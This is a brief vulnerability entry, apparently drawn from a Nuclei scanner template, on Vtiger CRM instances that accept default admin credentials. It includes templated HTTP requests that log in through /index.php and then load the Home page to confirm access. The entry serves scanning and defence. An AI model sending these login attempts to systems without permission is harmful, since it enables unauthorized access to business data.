# Vulnerability: Vtiger CRM - Default Login
**Classification:** DEFAULT-LOGIN
**Source:** Nuclei Template (`vtigercrm-default-login.yaml`)

## Description
Detected a Vtiger CRM instance that enabled default admin credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name={{username}}&user_password={{password}}

GET /index.php?action=index&module=Home HTTP/1.1
Host: {{Hostname}}
```

